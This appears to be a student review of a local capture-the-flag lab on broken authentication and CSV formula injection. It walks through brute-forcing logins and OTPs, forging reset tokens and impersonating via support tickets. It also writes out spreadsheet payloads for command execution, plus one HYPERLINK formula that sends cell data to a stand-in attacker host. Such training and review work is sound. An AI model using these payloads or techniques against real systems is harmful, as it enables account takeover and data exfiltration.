# Student Review: Comparer Cara (burp-05)
- Modules tested: Broken Authentication (/auth, 8 challenges) and CSV Formula Injection (/formula, 4 challenges), on the shared pool instance at http://127.0.0.1:18410/, tested as a Burp-first learner. Every exploit below was executed with curl standing in for Burp Repeater/Intruder using one cookie jar, and the equivalent Burp steps are written out for each challenge. All 12 flags captured in my final session (scoreboard 12/201, auth 8/8, formula 4/4). Re-verification note: the VM hosting the pool rebooted twice during testing (first outage around 01:37 UTC, second around 02:47 UTC). After the second reboot I re-ran every exploit on the live instance and the lab awarded the flag for all 12 again; the OTP challenge was fully re-brute-forced post-reboot (code found at 5851) and the scoreboard was re-checked at 12/201 afterward. The counts above are post-reboot.
- What worked well:
  - No Rate Limiting (Brute-Force Login): Burp steps: (1) Proxy: submit POST /auth/login once with alice and a wrong guess. (2) Proxy history, right-click the POST, Send to Intruder. (3) Positions: Clear, select only the password value, Add. Attack type: Sniper. (4) Payloads: Simple list, a handful of weak guesses with the real password after at least 5 wrong ones. (5) Start attack and watch for the one success response. In my run the lab awarded the flag when I logged in as alice after 6 failed attempts in the same session, and the welcome page itself reports the failed-attempt count, which makes the success obvious in the results table. Works fully in Burp Community.
  - Predictable Password Reset Tokens: Burp steps: (1) Proxy: GET /auth/reset?user=alice and read the token printed on the page. (2) Send the token to Decoder, Base64 decode: it is just the username. (3) In Decoder, Base64 encode the target username "admin". (4) Repeater: POST /auth/reset/confirm with the forged token and a new password; the lab awarded the flag. Decoder plus Repeater only, very Community friendly.
  - Username Enumeration: Burp steps: (1) Proxy: submit POST /auth/enum-login twice, once with a made-up user and once with a real user and a wrong password, and compare in HTTP history: the fake user gets "User X not found." while the real user gets "Wrong password for user alice.". (2) Send the POST to Intruder, Sniper on the username field only, short candidate list. (3) Options, Grep - Match: add both error phrases so valid users stand out in the results. (4) Submit a confirmed username at /auth/enum-submit in the same session; the lab awarded the flag. The hint ladder teaches exactly this flow, including the grep-match step.
  - Brute-Forcing a 4-Digit OTP (mechanics): Burp steps: (1) Open /auth/otp-reset through the Burp browser and copy the recovery token shown on the page. (2) Submit the form once, then Send the POST /auth/otp-reset/verify to Intruder from Proxy history. (3) Positions: Sniper, marker on the otp field only, so token and newPassword stay fixed. (4) Payloads: Numbers, from 0 to 9999, step 1, min integer digits 4 so codes keep their leading zeros. (5) Options, Grep - Match: "Password changed", because every failure says "Wrong code" and only the hit says that. (6) Start attack and take the code from the one matching row. My scripted equivalent of this attack found the code and the lab awarded the flag on the live instance; the endpoint never locked out, throttled, or expired the token across thousands of attempts, exactly as the challenge promises. First completion was pre-reboot (code 3150 after 3,151 requests); after the second VM reboot the run had to restart with a fresh token and found code 5851 after 5,852 requests, awarded on the live instance post-reboot. Feasibility caveat under Burp-first feasibility below.
  - SHA-256 Predictable Reset Token: Burp steps: (1) Proxy: request a reset for alice at /auth/sha-reset and read the token recipe the page itself prints (SHA-256 of username plus a fixed salt string). (2) Decoder: type "admin" plus the salt and use the Hash function with SHA-256; hint level 2 correctly names this Decoder feature, which many beginners do not know exists. (3) Repeater: POST /auth/sha-reset/confirm with the forged hash and a new password, never having requested an admin reset; the lab awarded the flag.
  - Guessable Security Question: Burp steps: (1) Proxy: browse /auth/bio/alice and read the public bio, which prints the mother's maiden name in plain text. (2) Repeater: POST /auth/question-reset with that answer and a new password; the lab awarded the flag. Correctly the easiest tooling in the module (Proxy plus Repeater).
  - Password Change Without Current Password: Burp steps: (1) Sign in at /auth/login through the Proxy so the session is captured. (2) Open /auth/change-password and look at the form: there is no current-password field at all. (3) Send the change POST to Repeater and replay it with a new password value; the lab awarded the flag. The lesson lands the moment you read the request in Burp, which is the right way to teach it.
  - Support Ticket Impersonation: Burp steps: (1) Proxy: open /auth/support and submit ticket 1001 once. (2) Send GET /auth/support/login?ticket=1001 to Repeater and step the ticket value upward one by one; the page states the recent range is 1001 to 1005, and ticket 1005 lands a session as admin, where the lab awarded the flag. (3) Intruder with a Numbers payload 1001 to 1005 works too and is fine in Community at this size. Non-admin tickets 1001 to 1004 correctly awarded nothing, and ticket 9999 correctly returned "Unknown ticket".
  - Formula module, all four challenges share one clean Burp pattern: (1) Proxy: capture POST /formula/add. (2) Send it to Repeater and shape the name field into the payload. (3) In Repeater, GET /formula/export.csv and read the X-Flags response header; the lab awarded the flag there for each variant. Payloads that worked for me: Classic: name cell =cmd|'/c calc'!A0. DDE: name cell =DDE("cmd";"/c calc";"!A0"). HYPERLINK: name cell =HYPERLINK("http://evil.example/?d="&A2,"Click"). Pipe: name cell |cmd|'/c calc'!A0. A normal contact produced no X-Flags header at all, so the award is tied to the payload, not to the download alone.
  - Cheat resistance was solid everywhere I probed it: logging in as alice with only 2 failed attempts first awarded nothing (the 5+ failure condition is real); submitting a username at /auth/enum-submit that I had never probed answered "Not confirmed" and awarded nothing; confirming a reset with a token the lab had legitimately issued for that same account (the honest flow) changed the password but awarded nothing; forging a SHA-256 reset token for a non-admin user changed that password but awarded nothing (the award is admin-only); a wrong security-question answer awarded nothing; POST /auth/change-password with no session returned "Sign in first" and awarded nothing.
  - Scoreboard check (extra duty): with all 12 flags captured, my scoreboard showed Broken Authentication 8/8 with a 100 percent bar and CSV Formula Injection 4/4, 12/201 overall. Before the OTP fell it showed 7/8 (88 percent) with the OTP row in a "missing" status. Per-challenge rows carry the correct names and difficulty pills (Easy and Medium, matching the module pages), a green "Captured" status with data-key="captured" for solved rows and "missing" for unsolved ones. No display bug found in names, counts, or captured states for these two modules, and the module pages also rendered captured flags on the challenge cards correctly.
- Bugs found (with reproduction):
  - Wrong port in the "Starting point" blocks on the auth module page: five challenges tell the student to open http://localhost:3000/... but this deployment of the lab does not listen on port 3000 (the pool serves it on 18410). Reproduction: open /auth and read the Starting point blocks for Predictable Password Reset Tokens, Username Enumeration, Brute-Forcing a 4-Digit OTP, Guessable Security Question, and Support Ticket Impersonation; the rendered page contains 6 occurrences of "localhost:3000". A Burp-first student who pastes that URL into the Burp browser hits a dead page before the challenge starts. The other challenges use relative paths and are fine. Fix: use relative paths everywhere.
  - Formula export awards flags for rows the current player never added (shared-state surprise): the export checks every stored contact on every download, so one GET /formula/export.csv awarded all four formula flags to my fresh session at once, because payload contacts from my own earlier tests were still stored. On a shared classroom instance a student could collect formula flags for payloads a classmate added. Reproduction: add the four payload contacts, start a new session, download the export once, and read an X-Flags header listing four flags. Consider scoping the award to contacts added in the current session, or document the behavior on the module page.
  - One transient oddity I could not reproduce: a single fresh-session request to /auth/support/login?ticket=1001 rendered alice with role "admin" and showed the flag banner. Three immediate re-tests with fresh sessions all rendered role "user" with no flag, and ticket 1005 behaved correctly throughout. I believe this was cross-talk from other testers changing shared data on the pool at that moment rather than a lab bug, but I am reporting it because a role flip would be serious if it ever recurred on a single-user install.
  - Pool stability note (environment, not lab code): the shared instance went down twice during my testing. The first outage rotated the flag values and wiped two in-progress OTP brute forces (one past 4,500 attempts, another past 4,200), forcing restarts from zero. The second reboot (around 02:47 UTC) reset per-boot state again; my session data survived it, and I re-ran all 12 exploits on the live instance afterward with the lab awarding the flag for each, including a fresh full OTP brute force that landed at code 5851. Worth warning students on shared instances that a restart can rotate flags and loses any in-progress brute-force run.
- Friction/confusion points:
  - The OTP challenge is the big one: the hint ladder teaches only the Intruder path, and in Burp Community that path is throttled so hard that 10,000 requests is an hours-long wall. Even my scripted equivalent, one request at a time against the loaded shared pool, needed about 25 minutes and 3,151 requests to land the code on its first completion, and after the second VM reboot the rerun with a fresh token took another 5,852 requests to land the code. Two earlier runs were also wiped by pool restarts mid-way (past 4,500 and past 4,200 attempts). The challenge is fair as a concept and unfair as a Community Edition time sink.
  - The login brute-force challenge never says where a wordlist comes from. A first-time Burp user does not know the Intruder Simple list accepts typed or pasted values. One line ("type or paste 6 to 10 common weak passwords; the right one is a very common one") removes the only stall I hit.
  - For the formula challenges the flag arrives only in the X-Flags response header, never in the page or the CSV body. Hint level 3 does say to watch the header, but a beginner in Repeater reads the body first, and hint levels 1 and 2 never mention headers. Put it in the main one-line hint.
  - The login failure counter is per browser session and resets on any successful login. Hint level 3 explains keeping one cookie, but nothing warns that test-logging-in midway with the right password (to "check it works") resets the counter to zero and silently voids the run. I did exactly this on my first pass and could not see why no flag appeared.
  - The OTP page issues a brand-new token (and a brand-new code) on every page load and never says so. Reloading the page to re-read the token quietly creates a second live token; the attack only works if you keep using the token inside the request you captured. One warning sentence fixes it.
- Hint quality (helpful? spoilery? useless?):
  - Helpful overall, the strongest ladders I have seen in this lab so far. The three levels (nudge, technique, attack shape) are consistent, and most level-2 hints name the exact Burp feature to use: Sniper positions, Grep - Match in Intruder, Decoder's Hash function, stepping a value in Repeater. That is precisely what a Burp learner needs.
  - Best ladders: Username Enumeration and SHA-256 Predictable Reset Token. Each level adds one concrete Burp action, and the final level still leaves the execution to the student.
  - Mildly spoilery at level 3 in places (the base64 reset ladder all but hands over "the token is base64 of the username"), but level 3 sits behind two clicks, so the spoiling is opt-in and earned. Fair design.
  - Weakest ladder: Brute-Forcing a 4-Digit OTP. Level 3 repeats "load a 0000-9999 payload set and watch for a different response" without the two facts that decide success in practice: Burp Community throttles Intruder (set expectations, or point at the Python and curl tools the card itself lists), and the success text is literally "Password changed" (naming it would let students reuse the Grep - Match trick the enumeration challenge just taught them).
  - Formula ladders are good on mechanics (Proxy capture, Repeater iteration, X-Flags header) but thin on payload shape: none of the four shows even a skeleton (that the pipe variant must start the cell, or that HYPERLINK takes the URL first and the label second). A first-characters skeleton per ladder would help without spoiling.
- Difficulty fairness:
  - Fair. The Easy challenges (both predictable reset tokens, security question, classic formula, DDE, pipe) are one-insight solves finished in minutes through Burp. The Mediums (login brute force, user enumeration, OTP, support impersonation, HYPERLINK) each add exactly one extra skill: Intruder setup, response comparison, sequential walking, or payload composition. The difficulty pills matched my experience in every case.
  - The only unfair-feeling element is wall-clock time, not reasoning: the OTP challenge's real cost is pure request volume, and on Burp Community or a loaded shared pool that volume dominates everything else about the challenge.
- Burp-first feasibility:
  - 11 of 12 challenges are fully doable in Burp Community with exactly the tools the lab names. Repeater and Decoder have no Community limits that matter here, and the small Intruder jobs (a login wordlist of about 10, a username candidate list, ticket numbers 1001 to 1005) all run fine despite Community throttling.
  - Brute-Forcing a 4-Digit OTP is not realistically doable in Burp Community the way the hints describe it: Intruder is rate-limited by design in Community, so 10,000 requests becomes an hours-long run that any restart wipes. The tools pill on the card honestly lists Python and curl as alternatives (Burp/ZAP, Python, curl), and my curl loop is exactly that fallback; it worked, finding the code at 3150. But the hint ladder never tells the Community student to switch tools. Verdict: comfortable in Burp Pro, impractical in Community; the lab should say so on the challenge itself.
  - Nothing in either module needs a Pro-only feature: no Collaborator, no scanner, no extensions. Decoder hashing, grep-match, sniper, and numbers payloads are all in Community.
  - Burp guidance accuracy: every named tool and feature is real and correctly described, including the less obvious ones (Decoder Hash, Intruder Grep - Match, Numbers payload zero padding implied by the 4-digit format). The guidance failures are omissions (Community OTP throttling, wordlist sourcing, the header-only formula flag, the counter reset) plus the wrong-port Starting point URLs, not wrong instructions.
- Suggestions (concrete):
  - Replace every "http://localhost:3000" in Starting point blocks with the relative path, matching the challenges that already do this.
  - On Brute-Forcing a 4-Digit OTP, add a note to the card or ladder: "Burp Community throttles Intruder heavily; a full 0000-9999 run can take hours. The Python and curl tools listed on this card are an accepted alternative. The success response contains the words Password changed, which also works as an Intruder Grep - Match rule."
  - On No Rate Limiting, add to hint level 2: "Payloads tab, Simple list: type or paste about 10 common weak passwords. Keep at least 5 wrong attempts before the right one, and do not log in successfully midway or the failed-attempt counter resets."
  - On all four formula challenges, move "the flag comes back in the X-Flags response header of GET /formula/export.csv" from hint level 3 into the main one-line hint, and add one payload skeleton per ladder showing only the opening characters.
  - On the formula module, either scope export awards to contacts added in the current session, or add one line warning that the export checks every stored contact, so shared instances can award flags for rows another student added.
  - On the OTP page, add: "Each page load issues a new token and a new code. Attack the token inside the request you captured, and do not reload this page mid-attack."
  - Warn students on shared or class instances that a server restart rotates the flags and loses any in-progress brute-force run.
- Rating: 4
